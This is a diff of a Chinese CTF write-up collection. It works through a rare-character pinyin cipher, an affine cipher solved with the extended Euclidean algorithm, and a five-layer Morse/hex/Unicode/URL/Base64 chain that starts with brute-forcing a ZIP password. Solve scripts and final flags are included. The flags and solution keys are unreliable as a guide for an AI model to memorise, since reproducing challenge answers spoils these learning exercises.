+罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝
+```
+
+提示：读了这句话感觉自己就是一个文盲。在小时候遇到不会的字我们都是怎么做的呢？没错——注拼音。
+
+### 解题思路
+
+**1. 识别编码类型**
+
+密文由 20 个生僻汉字组成，不是常见的 ASCII 编码、Hex、Base64 等格式。题目名称"老文盲了"和提示"注拼音"直接暗示解题方向。
+
+> **⚠️ 关键线索**：题目名称"文盲"+ 提示"注拼音" = 每个字的拼音是答案
+
+**2. 查询每个字的拼音**
+
+使用在线汉字拼音转换工具，获取每个字的读音：
+
+| 索引 | 字 | 拼音 | 首字母 |
+|------|----|------|--------|
+| 0 | 罼 | bi | b |
+| 1 | 雧 | ji | j |
+| 2 | 締 | di | d |
+| 3 | 眔 | da | d |
+| 4 | 擴 | kuo | k |
+| 5 | 灝 | hao | h |
+| 6 | 淛 | zhe | z |
+| 7 | 匶 | jiu | j |
+| 8 | 襫 | shi | s |
+| 9 | 黼 | fu | f |
+| 10 | 瀬 | lai | l |
+| 11 | 鎶 | ge | g |
+| 12 | 軄 | zhi | z |
+| 13 | 鶛 | jie | j |
+| 14 | 驕 | jiao | j |
+| 15 | 鳓 | le | l |
+| 16 | 哵 | ba | b |
+| 17 | 眔 | da | d |
+| 18 | 鞹 | kuo | k |
+| 19 | 鰝 | hao | h |
+
+**3. 分组解读**
+
+将 20 个字按语义分组：
+
+```
+索引  0-2:  罼雧締           → bi-ji-di → BJD (flag格式前缀)
+索引  3-5:  眔擴灝           → da-kuo-hao → 大括号 {
+索引  6-16: 淛匶襫黼瀬鎶軄鶛驕鳓哵 → zhe-jiu-shi-fu-lai-ge-zhi-jie-jiao-le-ba
+索引 17-19: 眔鞹鰝           → da-kuo-hao → 大括号 }
+```
+
+中文含义：这就是flag直接交了吧
+
+**4. 构造 Flag**
+
+flag 内容为大括号之间的生僻字原文：
+
+```
+BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
+```
+
+### 解题脚本
+
+```python
+# 手动建立生僻字→拼音映射（只有20个字，无需第三方库）
+HANZI_PINYIN = {
+    '罼': 'bi', '雧': 'ji', '締': 'di', '眔': 'da', '擴': 'kuo',
+    '灝': 'hao', '淛': 'zhe', '匶': 'jiu', '襫': 'shi', '黼': 'fu',
+    '瀬': 'lai', '鎶': 'ge', '軄': 'zhi', '鶛': 'jie', '驕': 'jiao',
+    '鳓': 'le', '哵': 'ba', '鞹': 'kuo', '鰝': 'hao',
+}
+
+CIPHERTEXT = '罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝'
+
+def get_full_pinyin(text):
+    return [HANZI_PINYIN.get(ch, '?') for ch in text]
+
+def solve():
+    pinyins = get_full_pinyin(CIPHERTEXT)
+    initials = ''.join(p[0] for p in pinyins)
+
+    # 分组：BJD(0-2) {(3-5) 内容(6-16) }(17-19)
+    flag_content = CIPHERTEXT[6:17]
+    flag = f'BJD{{{flag_content}}}'
+
+    print(f'拼音首字母序列: {initials}')
+    print(f'分组: BJD {{ {flag_content} }}')
+    print(f'中文含义: 这就是flag直接交了吧')
+    print(f'Flag: {flag}')
+
+solve()
+```
+
+### 运行结果
+
+```
+拼音首字母序列: bjddkhzjsflgzjjlbdkh
+分组: BJD { 淛匶襫黼瀬鎶軄鶛驕鳓哵 }
+中文含义: 这就是flag直接交了吧
+Flag: BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
+```
+
+Flag: `BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| 生僻字密码 | 用不常见汉字的拼音首字母隐藏信息，常见于中文 CTF |
+| 拼音首字母法 | 每个字取拼音首字母拼接，类似藏头诗的变体 |
+| "大括号"文字编码 | `眔擴灝` → da-kuo-hao → 大括号，用文字描述特殊符号 |
+| 汉字拼音查询 | 在线工具如 [汉字拼音转换器](https://www.aies.cn/pinyin.htm) 可批量查拼音 |
+| 题目名称暗示 | "老文盲了" → 看不懂字 → 查拼音，题目名本身就是解题提示 |
+
+> **技巧**：遇到全是生僻字的密文，第一反应应该是查每个字的拼音，取首字母拼接。常见于 BJDCTF 等国内比赛的 Crypto/Misc 分类。
+
+### 同类变体与扩展
+
+- 变体1：取拼音的**完整拼写**而非首字母（如 `zhejiushiflag`）
+- 变体2：结合**部首拆解**（如"武"→止+戈）或**笔画数**编码
+- 变体3：利用**汉字 Unicode 码点**的某种运算进行编码（需排除此方向后才转拼音）
+- 工具推荐：`pypinyin` Python 库可程序化批量获取拼音，但生僻字覆盖可能不全
+- 相关中文密码类型：与佛论禅、百家姓密码、仓颉码、四角号码等
+
+---
+
+## 第16题：仿射密码 — 小学生密码学
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Crypto - 经典密码 |
+| 难度 | 入门 |
+| 日期 | 2026-08-01 |
+| 关联课程 | 信息安全数学基础（数论） |
+
+### 题目内容
+
+加密函数：`e(x) = 11x + 6 (mod 26)`
+
+密文：`welcylk`
+
+（flag 为 base64 形式）
+
+### 解题思路
+
+**1. 识别密码类型**
+
+`e(x) = ax + b (mod m)` 是标准的**仿射密码（Affine Cipher）**公式，其中：
+- `a = 11`（乘法密钥）
+- `b = 6`（加法密钥/位移）
+- `m = 26`（字母表长度）
+
+仿射密码 = 凯撒密码（加法）+ 乘法密码的复合，是信息安全数学基础课的经典内容。
+
+> **⚠️ 你说的"阿基米德算法"其实是"扩展欧几里得算法"（Extended Euclidean Algorithm）**，正是这题的核心——用来求模逆元进行解密。
+
+**2. 数学原理：仿射密码的加解密**
+
+```
+加密: E(x) = (a * x + b) mod m
+解密: D(y) = a_inv * (y - b) mod m
+```
+
+其中 `a_inv` 是 `a` 模 `m` 的**乘法逆元**，满足 `a * a_inv ≡ 1 (mod m)`。
+
+关键前提：`gcd(a, m) = 1`（a 和 m 必须互素），否则模逆元不存在，密码不可逆。
+
+```
+gcd(11, 26) = 1 → 可解 ✓
+```
+
+**3. 扩展欧几里得算法求模逆元**
+
+扩展欧几里得算法在求 `gcd(a, m)` 的同时，找到整数 `x, y` 满足：
+
+```
+a * x + m * y = gcd(a, m)
+```
+
+当 `gcd = 1` 时，`x` 就是 `a` 的模逆元（取正模后）。
+
+```
+gcd(11, 26):
+  26 = 2 * 11 + 4    →  gcd(11, 4)
+  11 = 2 * 4 + 3     →  gcd(4, 3)
+  4  = 1 * 3 + 1     →  gcd(3, 1)
+  3  = 3 * 1 + 0     →  gcd = 1
+
+回代求 Bezout 系数:
+  1 = 4 - 1*3
+    = 4 - 1*(11 - 2*4) = 3*4 - 11
+    = 3*(26 - 2*11) - 11 = 3*26 - 7*11
+
+所以: -7*11 ≡ 1 (mod 26)
+      11 * (-7) ≡ 1 (mod 26)
+      a_inv = -7 mod 26 = 19
+
+验证: 11 * 19 = 209 = 8*26 + 1 ≡ 1 (mod 26) ✓
+```
+
+> **技巧**：手算模逆元时，也可以暴力枚举——从 1 到 25 逐个试 `(11 * i) % 26 == 1`，很快就能找到 19。但理解扩展欧几里得算法的原理更重要，因为大数场景（如 RSA）暴力不可行。
+
+**4. 逐字符解密**
+
+```
+解密公式: D(y) = 19 * (y - 6) mod 26
+
+w: y=22, D = 19*(22-6) mod 26 = 19*16 mod 26 = 304 mod 26 = 18 → s
+e: y=4,  D = 19*(4-6)  mod 26 = 19*(-2) mod 26 = -38 mod 26 = 14 → o
+l: y=11, D = 19*(11-6) mod 26 = 19*5  mod 26 = 95  mod 26 = 17 → r
+c: y=2,  D = 19*(2-6)  mod 26 = 19*(-4) mod 26 = -76 mod 26 = 2  → c
+y: y=24, D = 19*(24-6) mod 26 = 19*18 mod 26 = 342 mod 26 = 4  → e
+l: y=11, D = 19*(11-6) mod 26 = 19*5  mod 26 = 95  mod 26 = 17 → r
+k: y=10, D = 19*(10-6) mod 26 = 19*4  mod 26 = 76  mod 26 = 24 → y
+
+明文: sorcery (巫术/魔法)
+```
+
+**5. Base64 编码**
+
+```
+sorcery → base64 → c29yY2VyeQ==
+```
+
+Flag: `flag{c29yY2VyeQ==}`
+
+### 解题脚本
+
+```python
+import base64
+
+a, b, m = 11, 6, 26
+CIPHERTEXT = 'welcylk'
+
+def extended_gcd(a, m):
+    """扩展欧几里得算法，返回 (gcd, x, y) 使 a*x + m*y = gcd"""
+    if a == 0:
+        return m, 0, 1
+    g, x1, y1 = extended_gcd(m % a, a)
+    return g, y1 - (m // a) * x1, x1
+
+def mod_inverse(a, m):
+    """求 a 模 m 的乘法逆元"""
+    g, x, _ = extended_gcd(a % m, m)
+    if g != 1:
+        raise ValueError(f'{a} 和 {m} 不互素，无模逆元')
+    return x % m
+
+# 求模逆元
+a_inv = mod_inverse(a, m)
+print(f'a_inv = {a_inv}')  # 19
+
+# 解密: D(y) = a_inv * (y - b) mod m
+plaintext = ''.join(
+    chr((a_inv * (ord(ch) - ord('a') - b)) % m + ord('a'))
+    for ch in CIPHERTEXT
+)
+print(f'明文: {plaintext}')  # sorcery
+
+# Base64 编码
+flag = base64.b64encode(plaintext.encode()).decode()
+print(f'Flag: flag{{{flag}}}')
+```
+
+### 运行结果
+
+```
+仿射密码: E(x) = 11x + 6 (mod 26)
+密文: welcylk
+
+[1] 扩展欧几里得算法:
+    gcd(11, 26) = 1 (必须为1，否则不可解)
+    11 的模逆元 a_inv = 19
+    验证: 11 * 19 mod 26 = 1
+    解密公式: D(y) = 19 * (y - 6) mod 26
+
+[2] 解密:
+    密文: welcylk
+    明文: sorcery
+
+[3] 加密验证:
+    明文: sorcery
+    加密: welcylk
+    匹配: True
+
+[4] Base64 编码:
+    明文: sorcery
+    Base64: c29yY2VyeQ==
+
+Flag: flag{c29yY2VyeQ==}
+```
+
+Flag: `flag{c29yY2VyeQ==}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| 仿射密码 | `E(x) = ax + b (mod m)`，凯撒密码的推广，结合乘法密码与加法密码 |
+| 模逆元 | `a * a_inv ≡ 1 (mod m)`，解密的关键，需 `gcd(a, m) = 1` |
+| 扩展欧几里得算法 | 求 gcd 同时求 Bezout 系数，用于计算模逆元 |
+| gcd 互素条件 | `gcd(a, m) = 1` 是仿射密码可逆的充要条件 |
+| Base64 编码 | 将字节序列编码为 ASCII 字符，CTF 常见的 flag 包装格式 |
+| 模运算 | 负数取模需注意：`-38 mod 26 = 14`（不是 -12），Python 的 `%` 自动处理 |
+
+> **技巧**：识别仿射密码——看到 `e(x) = ax + b (mod m)` 形式就是仿射密码。解题三步走：①验证 `gcd(a,m)=1` → ②扩展欧几里得求 `a_inv` → ③代入 `D(y) = a_inv * (y-b) mod m` 逐字符解密。
+
+> **技巧**：Python 的 `%` 运算符对负数也返回非负结果（如 `-38 % 26 = 14`），所以解密公式可以直接写 `(a_inv * (y - b)) % m`，无需手动处理负数。C/C++/Java 则需加 `m` 再取模。
+
+### 同类变体与扩展
+
+- **已知 a, b 直接解**：本题形式，最简单
+- **已知 a, b 未知（已知明文攻击）**：通过一对明文-密文列出方程组求解
+- **唯密文攻击**：利用字母频率分析 + 暴力枚举 `a`（12 个候选值）和 `b`（26 个候选值），共 312 种可能
+- **a 的有效值**：模 26 下与 26 互素的 a 有 φ(26) = 12 个（1,3,5,7,9,11,15,17,19,21,23,25），密钥空间 12×26 = 312
+- **与 RSA 的联系**：RSA 解密也需要模逆元求 `d = e_inv mod φ(n)`，但模数极大，暴力不可行，必须用扩展欧几里得
+- **Hill 密码**：仿射密码的矩阵推广版，`E(x) = Kx + b (mod m)`，K 为矩阵，逆元变为逆矩阵
+
+---
+
+## 第19题：easyencode — 五层嵌套编码
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Crypto - 多层编码 |
+| 难度 | 入门 |
+| 日期 | 2026-08-01 |
+| 题目文件 | `easyencode.zip`（345字节，ZipCrypto加密） |
+
+### 编码链路总览
+
+```
+easyencode.zip (ZIP密码: 100861)
+  └─ encode.txt (3124字节摩斯电码)
+       └─ [Layer 1] 摩斯电码解码 → 528字符hex字符串
+            └─ [Layer 2] Hex解码 → 264字符 \uXXXX Unicode转义序列
+                 └─ [Layer 3] Unicode转义解码 → 44字符 Base64+URL编码
+                      └─ [Layer 4] URL解码 (%3D→=) → 标准Base64
+                           └─ [Layer 5] Base64解码 → flag
+```
+
+### 解题过程
+
+**1. ZIP暴力破解**
+
+ZIP 文件使用 ZipCrypto 传统加密（非 AES）。文件仅 345 字节，含一个 `encode.txt`（原始大小 3124 字节）。
+
+排除伪加密后，对 6 位纯数字密码进行暴力枚举：
+
+```python
+import zipfile, itertools
+
+with zipfile.ZipFile('easyencode.zip', 'r') as z:
+    for combo in itertools.product('0123456789', repeat=6):
+        pwd = ''.join(combo).encode()
+        try:
+            z.setpassword(pwd)
+            z.read('encode.txt')
+            print(f"Password: {pwd.decode()}")
+            break
+        except:
+            continue
+# 密码: 100861
+```
+
+> **技巧**：CTF 中 ZIP 密码常见为纯数字（手机号、短数字）。6 位数字仅 100 万种组合，Python `itertools.product` 几秒内可枚举完毕。
+
+**2. 第一层：摩斯电码解码**
+
+解压后的 `encode.txt` 内容全部是摩斯电码（`.` 和 `-`，空格分隔）：
+
+```
+..... -.-. --... ..... ...-- ----- ...-- ----- ...-- ..... ...-- ..--- .....
+```
+
+摩斯解码使用标准码表。注意本题摩斯码只使用了数字 `0-9` 和字母 `C`（`-.-.`）：
+
+```python
+MORSE_CODE = {
+    '.....': '5', '-.-.': 'C', '--...': '7', '...--': '3',
+    '-----': '0', '....-': '4', '..---': '2', '-....': '6',
+    # ... 完整码表
+}
+decoded = ''.join(MORSE_CODE[m] for m in morse_text.split(' '))
+# 结果: 5C75303035325C75303034375C75303035365C75303037615C...
+# 长度: 528 字符，全部为 hex 字符 (0-9, A-F 中的 C)
+```
+
+> **技巧**：摩斯电码中只出现数字和少数字母时，解码结果很可能是 hex 编码。`5C` = `\`、`75` = `u` 是 Unicode 转义 `\u` 的典型开头，是识别下一层编码的关键线索。
+
+**3. 第二层：Hex 解码**
+
+528 字符 hex 字符串每 2 位一组，解码为 264 字节 ASCII 文本：
+
+```python
+hex_bytes = bytes.fromhex(decoded_morse)
+unicode_escaped = hex_bytes.decode('ascii')
+# 结果: \u0052\u0047\u0056\u007a\u0064\u0044\u0042\u006e\u004d\u0033\u0074\u0045...
+```
+
+Hex 解码后得到的是 `\uXXXX` 格式的 Unicode 转义序列，每 6 个字符（`\u` + 4位hex）表示一个字符。
+
+**4. 第三层：Unicode 转义解码**
+
+将 `\uXXXX` 转义序列逐个转换为实际字符：
+
+```python
+import re
+result = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), unicode_escaped)
+# 结果: RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D
+```
+
+解码后得到 44 字符的字符串，看起来像 Base64 但末尾是 `%3D%3D` 而非 `==`。
+
+> **技巧**：`\uXXXX` 是 JavaScript/Python/Java 中常见的 Unicode 转义格式。正则 `\\u([0-9a-fA-F]{4})` 可批量匹配并转换。注意 Python 字符串中 `\u` 本身是转义前缀，处理时需用原始字符串 `r'\u'` 或双反斜杠 `\\u`。
+
+**5. 第四层：URL 解码**
+
+`%3D` 是 `=` 的 URL 百分号编码。Base64 的填充字符 `=` 被 URL 编码了：
+
+```python
+import urllib.parse
+b64_str = urllib.parse.unquote('RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D')
+# 结果: RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==
+```
+
+> **技巧**：URL 百分号编码常用于隐藏 Base64 的 `=` 填充符。`%3D` = `=`、`%2B` = `+`、`%2F` = `/` 是 Base64 字符集中常被 URL 编码的三个字符。看到以 `%3D%3D` 结尾的字符串应立即联想到 URL 编码的 Base64。
+
+**6. 第五层：Base64 解码**
+
+标准 Base64 解码得到最终 flag：
+
+```python
+import base64
+flag = base64.b64decode('RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==').decode('utf-8')
+# 结果: Dest0g3{Deoding_1s_e4sy_4_U}
+```
+
+### 验证
+
+```
+Layer 1 (Morse):    5C75303035325C7530303437...  (528 chars)
+Layer 2 (Hex):      \u0052\u0047\u0056\u007a...  (264 chars)
+Layer 3 (Unicode):  RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D  (44 chars)
+Layer 4 (URL):      RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==  (44 chars)
+Layer 5 (Base64):   Dest0g3{Deoding_1s_e4sy_4_U}  ✓
+```
+
+Flag: `Dest0g3{Deoding_1s_e4sy_4_U}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| ZIP 暴力破解 | ZipCrypto 传统加密，6 位纯数字密码可通过 `itertools.product` 快速枚举 |
+| 摩斯电码 (Morse Code) | 点划编码，数字 0-9 和字母 A-Z 各有唯一编码；本题仅用数字+字母C |
+| Hex 编码 | 每 2 个 hex 字符表示 1 字节，`5C`=`\`、`75`=`u` 是识别 Unicode 转义的关键 |
+| Unicode 转义 `\uXXXX` | 4 位 hex 表示 Unicode 码点，常见于 JS/Python/Java 字符串 |
+| URL 百分号编码 | `%XX` 格式，`%3D`=`=`、`%2B`=`+`、`%2F`=`/`，常隐藏 Base64 特殊字符 |
+| Base64 编码 | 3 字节→4 字符，`=` 为末尾填充，`+` 和 `/` 为扩展字符 |
+
+> **技巧**：多层编码题的通用解题策略——**从外到内逐层剥离**。每层解码后先观察结果特征（字符集、长度、结构），再判断下一层编码类型。关键识别特征：① 全 hex 字符→Hex解码；② `\uXXXX` 模式→Unicode转义；③ `%XX` 模式→URL解码；④ `[A-Za-z0-9+/=]` 字符集→Base64解码。
+
+> **技巧**：题名是最好的提示。`easyencode` 强调"编码"而非"加密"，意味着无需密钥的编码链，关键是识别每层编码类型。类似题名还有 `encode`、`encoding`、`base` 等。
+
+### 同类变体与扩展
+
+- **编码层数变化**：常见 2-5 层嵌套，可能加入 Base32、Base58、ROT13、AAencode（JS颜文字编码）、Brainfuck 等冷门编码
+- **UUencode/XXencode**：较老的二进制转文本编码，字符集不同于 Base64
+- **摩斯电码变体**：分隔符可能用 `/` 或换行而非空格；可能包含标点符号摩斯码
+- **Hex 变体**：可能用 `0x` 前缀、`\x` 前缀、或空格分隔的 hex
+- **防御/检测**：多层编码是恶意软件混淆 payload 的常见手段，YARA 规则可检测 base64/hex 链式编码特征
+
+### 解题脚本
+
+完整脚本：[Crypto/19-easyencode/solve.py](Crypto/19-easyencode/solve.py)
+
+```python
+# 核心解码链（5层）
+import zipfile, re, base64, urllib.parse
+
+# Layer 0: ZIP解压 (密码: 100861)
+with zipfile.ZipFile('easyencode.zip', 'r') as z:
+    z.setpassword(b'100861')
+    morse_text = z.read('encode.txt').decode('utf-8')
+
+# Layer 1: 摩斯电码 → hex字符串
+MORSE = {'.....': '5', '-.-.': 'C', '--...': '7', '...--': '3', '-----': '0', ...}
+hex_str = ''.join(MORSE[m] for m in morse_text.split(' '))
+
+# Layer 2: Hex解码 → \uXXXX Unicode转义
+unicode_escaped = bytes.fromhex(hex_str).decode('ascii')
+
+# Layer 3: Unicode转义解码 → Base64+URL编码
+b64_url = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), unicode_escaped)
+
+# Layer 4: URL解码 → 标准Base64
+b64_str = urllib.parse.unquote(b64_url)
+
+# Layer 5: Base64解码 → flag
+flag = base64.b64decode(b64_str).decode('utf-8')
+print(flag)  # Dest0g3{Deoding_1s_e4sy_4_U}
+```
+
+---
+
+
+---
+
+## Reverse 方向
 
 ## 第10题：Java 逆向 — 字节码反编译与加密逆运算
 
@@ -2233,641 +4349,10 @@ Flag: `flag{BruteForceIsAGoodwaytoGetFlag}`
 - **约束求解框架**：对复杂消歧场景可用 Z3 SMT solver 自动求解，避免手动枚举
 - **动态分析替代**：可用 x64dbg 动态调试，在 `memcmp` 前断点 dump 加密后的输入，直接获取密文
 
-## 第14题：[BJDCTF 2nd] 燕言燕语 — Hex 解码 + 维吉尼亚密码
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Crypto - 编码转换 + 维吉尼亚密码 |
-| 难度 | 入门 |
-| 日期 | 2026-08-01 |
-| 来源 | BJDCTF 2nd |
-| 脚本 | [solve.py](Crypto/14-bjdctf-yanzi/solve.py) |
-
-### 题目描述
-
-> 小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说: 79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20
-
-题目给出一段十六进制字符串，结合"燕子"主题，需要逐步解码。
-
-### 解题思路
-
-**1. Hex 解码**
-
-题目字符串为纯十六进制（0-9, A-F），直接转换为 ASCII：
-
-```
-79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20
-→ yanzi ZJQ{xilzv_iqssuhoc_suzjg}
-```
-
-解码后分为两部分：
-- `yanzi`（燕子拼音）— 密钥提示
-- `ZJQ{xilzv_iqssuhoc_suzjg}` — 密文
-
-**2. 密码类型识别**
-
-> **技巧** 看到密文格式 `ZJQ{...}` 而比赛是 BJDCTF，猜测明文应为 `BJD{...}`。对比各字母偏移量：Z→B(24), J→J(0), Q→D(15) — 偏移量不一致，排除凯撒密码。偏移量随位置变化，指向**维吉尼亚密码**。
-
-分析 `Z→B` 的偏移：`(25 - 24) % 26 = 1`，而密钥第一个字母 `y` 的值也是 24（`ord('y')-ord('a')=24`），符合维吉尼亚加密公式 `cipher = (plain + key) % 26`。
-
-**3. 维吉尼亚解密**
-
-```
-解密公式：plain[i] = (cipher[i] - key[i]) % 26
-```
-
-密钥 `yanzi` 循环使用，跳过非字母字符（`{`、`_`、`}`），仅对字母位置推进密钥索引。
-
-```
-密文: Z  J  Q  {  x  i  l  z  v  _  i  q  s  s  u  h  o  c  _  s  u  z  j  g  }
-密钥: y  a  n  z  i  y  a  n  z  i  y  a  n  z  i  y  a  n  z  i  y  a  n
-明文: b  j  d  {  y  a  n  z  i  _  j  i  u  s  h  i  g  e  _  s  h  a  b  i  }
-```
-
-### 解题脚本
-
-```python
-hex_str = '79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20'
-
-# Step 1: Hex 解码
-decoded = bytes.fromhex(hex_str).decode('ascii')
-# => 'yanzi ZJQ{xilzv_iqssuhoc_suzjg}'
-
-key = 'yanzi'
-cipher = decoded.strip().split(' ', 1)[1]  # 取空格后的密文部分
-
-# Step 2: 维吉尼亚解密
-def vigenere_decrypt(ciphertext, key):
-    result = []
-    ki = 0
-    for ch in ciphertext:
-        if ch.isalpha():
-            c = ord(ch.lower()) - ord('a')
-            k = ord(key[ki % len(key)].lower()) - ord('a')
-            p = (c - k) % 26
-            result.append(chr(p + ord('a')))
-            ki += 1
-        else:
-            result.append(ch)
-    return ''.join(result)
-
-plaintext = vigenere_decrypt(cipher, key)
-print(f'Flag: {plaintext}')
-```
-
-### 运行结果
-
-```
-[1] Hex 解码: 'yanzi ZJQ{xilzv_iqssuhoc_suzjg} '
-    密钥: yanzi
-    密文: ZJQ{xilzv_iqssuhoc_suzjg}
-[2] 维吉尼亚解密: bjd{yanzi_jiushige_shabi}
-[3] 验证加密: zjq{xilzv_iqssuhoc_suzjg}
-    匹配: True
-
-Flag: bjd{yanzi_jiushige_shabi}
-```
-
-Flag: `bjd{yanzi_jiushige_shabi}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| Hex 编码 | 每个字符用两位十六进制表示，`bytes.fromhex()` 一键解码 |
-| 维吉尼亚密码 | 多表替换密码，密钥循环使用，`cipher = (plain + key) % 26` |
-| 凯撒 vs 维吉尼亚 | 凯撒是固定偏移（单表），维吉尼亚是随位置变化的偏移（多表） |
-| 密钥提示识别 | 题目文本中的关键词（如"yanzi"）可能就是密钥 |
-| flag 格式识别 | `ZJQ{...}` → `BJD{...}` 的偏移差异用于判断密码类型 |
-| 非字母跳过 | 维吉尼亚解密时 `{`、`_`、`}` 等非字母字符不消耗密钥索引 |
-
-### 同类变体与扩展
-
-- 若密钥未直接给出，可用[维吉尼亚破解工具](https://www.guballa.de/vigenere-solver)或 Kasiski 测试法 + 字频分析自动破解
-- 偏移量不固定也可能是指定位置的凯撒变体，需注意区分
-- Hex 可能替换为 Base32/Base64/URL 编码，解题第一步总是识别编码方式
-- 若解出后明文不可读，检查是否有第二层加密（如先 Hex 再 Base64 再维吉尼亚的链式编码）
-- 常见 CTF 编码识别：纯 0-9A-F → Hex；末尾 `=` → Base64；纯 A-Z2-7 → Base32；`%` 开头 → URL 编码
 
 ---
 
-## 第15题：老文盲了 — 生僻字拼音密码
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Crypto - 编码/文字密码 |
-| 来源 | BJDCTF 2nd |
-| 难度 | 入门 |
-| 日期 | 2026-08-01 |
-
-### 题目内容
-
-```
-罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝
-```
-
-提示：读了这句话感觉自己就是一个文盲。在小时候遇到不会的字我们都是怎么做的呢？没错——注拼音。
-
-### 解题思路
-
-**1. 识别编码类型**
-
-密文由 20 个生僻汉字组成，不是常见的 ASCII 编码、Hex、Base64 等格式。题目名称"老文盲了"和提示"注拼音"直接暗示解题方向。
-
-> **⚠️ 关键线索**：题目名称"文盲"+ 提示"注拼音" = 每个字的拼音是答案
-
-**2. 查询每个字的拼音**
-
-使用在线汉字拼音转换工具，获取每个字的读音：
-
-| 索引 | 字 | 拼音 | 首字母 |
-|------|----|------|--------|
-| 0 | 罼 | bi | b |
-| 1 | 雧 | ji | j |
-| 2 | 締 | di | d |
-| 3 | 眔 | da | d |
-| 4 | 擴 | kuo | k |
-| 5 | 灝 | hao | h |
-| 6 | 淛 | zhe | z |
-| 7 | 匶 | jiu | j |
-| 8 | 襫 | shi | s |
-| 9 | 黼 | fu | f |
-| 10 | 瀬 | lai | l |
-| 11 | 鎶 | ge | g |
-| 12 | 軄 | zhi | z |
-| 13 | 鶛 | jie | j |
-| 14 | 驕 | jiao | j |
-| 15 | 鳓 | le | l |
-| 16 | 哵 | ba | b |
-| 17 | 眔 | da | d |
-| 18 | 鞹 | kuo | k |
-| 19 | 鰝 | hao | h |
-
-**3. 分组解读**
-
-将 20 个字按语义分组：
-
-```
-索引  0-2:  罼雧締           → bi-ji-di → BJD (flag格式前缀)
-索引  3-5:  眔擴灝           → da-kuo-hao → 大括号 {
-索引  6-16: 淛匶襫黼瀬鎶軄鶛驕鳓哵 → zhe-jiu-shi-fu-lai-ge-zhi-jie-jiao-le-ba
-索引 17-19: 眔鞹鰝           → da-kuo-hao → 大括号 }
-```
-
-中文含义：这就是flag直接交了吧
-
-**4. 构造 Flag**
-
-flag 内容为大括号之间的生僻字原文：
-
-```
-BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
-```
-
-### 解题脚本
-
-```python
-# 手动建立生僻字→拼音映射（只有20个字，无需第三方库）
-HANZI_PINYIN = {
-    '罼': 'bi', '雧': 'ji', '締': 'di', '眔': 'da', '擴': 'kuo',
-    '灝': 'hao', '淛': 'zhe', '匶': 'jiu', '襫': 'shi', '黼': 'fu',
-    '瀬': 'lai', '鎶': 'ge', '軄': 'zhi', '鶛': 'jie', '驕': 'jiao',
-    '鳓': 'le', '哵': 'ba', '鞹': 'kuo', '鰝': 'hao',
-}
-
-CIPHERTEXT = '罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝'
-
-def get_full_pinyin(text):
-    return [HANZI_PINYIN.get(ch, '?') for ch in text]
-
-def solve():
-    pinyins = get_full_pinyin(CIPHERTEXT)
-    initials = ''.join(p[0] for p in pinyins)
-
-    # 分组：BJD(0-2) {(3-5) 内容(6-16) }(17-19)
-    flag_content = CIPHERTEXT[6:17]
-    flag = f'BJD{{{flag_content}}}'
-
-    print(f'拼音首字母序列: {initials}')
-    print(f'分组: BJD {{ {flag_content} }}')
-    print(f'中文含义: 这就是flag直接交了吧')
-    print(f'Flag: {flag}')
-
-solve()
-```
-
-### 运行结果
-
-```
-拼音首字母序列: bjddkhzjsflgzjjlbdkh
-分组: BJD { 淛匶襫黼瀬鎶軄鶛驕鳓哵 }
-中文含义: 这就是flag直接交了吧
-Flag: BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
-```
-
-Flag: `BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| 生僻字密码 | 用不常见汉字的拼音首字母隐藏信息，常见于中文 CTF |
-| 拼音首字母法 | 每个字取拼音首字母拼接，类似藏头诗的变体 |
-| "大括号"文字编码 | `眔擴灝` → da-kuo-hao → 大括号，用文字描述特殊符号 |
-| 汉字拼音查询 | 在线工具如 [汉字拼音转换器](https://www.aies.cn/pinyin.htm) 可批量查拼音 |
-| 题目名称暗示 | "老文盲了" → 看不懂字 → 查拼音，题目名本身就是解题提示 |
-
-> **技巧**：遇到全是生僻字的密文，第一反应应该是查每个字的拼音，取首字母拼接。常见于 BJDCTF 等国内比赛的 Crypto/Misc 分类。
-
-### 同类变体与扩展
-
-- 变体1：取拼音的**完整拼写**而非首字母（如 `zhejiushiflag`）
-- 变体2：结合**部首拆解**（如"武"→止+戈）或**笔画数**编码
-- 变体3：利用**汉字 Unicode 码点**的某种运算进行编码（需排除此方向后才转拼音）
-- 工具推荐：`pypinyin` Python 库可程序化批量获取拼音，但生僻字覆盖可能不全
-- 相关中文密码类型：与佛论禅、百家姓密码、仓颉码、四角号码等
-
----
-
